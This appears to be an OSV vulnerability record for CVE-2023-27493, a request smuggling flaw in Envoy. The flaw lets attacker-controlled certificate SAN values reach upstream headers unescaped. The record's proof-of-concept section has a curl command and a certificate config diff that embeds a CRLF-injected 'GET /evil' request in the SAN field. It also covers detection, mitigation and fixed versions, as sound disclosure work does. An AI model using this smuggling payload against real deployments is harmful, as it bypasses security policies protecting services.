{
  "modified": "2023-04-04T14:49:49Z",
  "published": "2023-04-04T14:49:49Z",
  "schema_version": "1.5.0",
  "id": "CVE-2023-27493",
  "aliases": [
    "GHSA-w5w5-487h-qv8q"
  ],
  "details": "### Impact\r\n\r\nRequest smuggling and bypass of security policies.\r\n\r\n### Affected components\r\n\r\nHTTP\r\n\r\n### Attack vector/s\r\n\r\nA specifically constructed HTTP request or mTLS connection with a specifically crafted client certificate.\r\n\r\nEnvoy configuration must also include an option to add request headers that were generated using inputs from the request, i.e. the peer certificate SAN.\r\n\r\n### Description\r\n\r\nEnvoy does not sanitize or escape request properties when generating request headers. This can lead to characters that are illegal in header values to be sent to the upstream service. \r\n\r\nIn the worst case it can cause upstream service to interpret the original request as two pipelined requests, possibly bypassing the intent of Envoyâ€™s security policy.\r\n\r\n### Example exploit or proof-of-concept\r\n\r\nFirst add a configuration to add request headers on requests to upstream.\r\n\r\n```yaml\r\n+                request_headers_to_add:\r\n+                  - header:\r\n+                      key: x-foo\r\n+                      value: \"%DOWNSTREAM_PEER_FINGERPRINT_256%  %DOWNSTREAM_PEER_URI_SAN%\"\r\n```\r\n\r\nThen with curl:\r\n\r\n```console\r\ncurl -v --cacert test/config/integration/certs/servercert.pem --cert /tmp/clientcert.pem --key /tmp/clientkey.pem https://lyft.com:10000 --resolve lyft.com:10000:127.0.0.1 -H \"Host: 127.0.0.1:20000\"\r\n```\r\n\r\nThe client cert/key were generated via test/config/integration/certs/certs.sh with the following patch:\r\n\r\n```diff\r\ndiff --git a/test/config/integration/certs/clientcert.cfg b/test/config/integration/certs/clientcert.cfg\r\nindex 59da6cb1ee..68f913d1bd 100644\r\n--- a/test/config/integration/certs/clientcert.cfg\r\n+++ b/test/config/integration/certs/clientcert.cfg\r\n@@ -35,6 +35,6 @@ subjectKeyIdentifier = hash\r\n authorityKeyIdentifier = keyid:always\r\n \r\n [alt_names]\r\n-URI.1 = spiffe://lyft.com/frontend-team\r\n+URI.1 = spiffe://lyft.com/\\r\\n\\r\\nGET /evil HTTP/1.1\\r\\n\\r\\nfrontend-team\r\n DNS.1 = lyft.com\r\n DNS.2 = www.lyft.com\r\n```\r\n\r\n### Detection\r\n\r\nThe detection is possible if the request properties that are used to synthesize new headers are recorded in the access log. Examining the request log for presence of illegal characters, such as CR or LF, can indicate a possible attack.\r\n\r\n### Mitigation\r\n\r\nDisable adding request headers based on the downstream request properties, such as downstream certificate properties. \r\n\r\n",
  "affected": [
    {
      "package": {
        "ecosystem": "DHI",
        "name": "envoy",
        "purl": "pkg:dhi/envoy"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.22.9"
            },
            {
              "introduced": "1.23.0"
            },
            {
              "fixed": "1.23.6"
            },
            {
              "introduced": "1.24.0"
            },
            {
              "fixed": "1.24.4"
            },
            {
              "introduced": "1.25.0"
            },
            {
              "fixed": "1.25.3"
            }
          ]
        }
      ],
      "database_specific": {
        "source_ecosystem": "envoy",
        "source_package": "Envoy"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-w5w5-487h-qv8q"
    }
  ]
}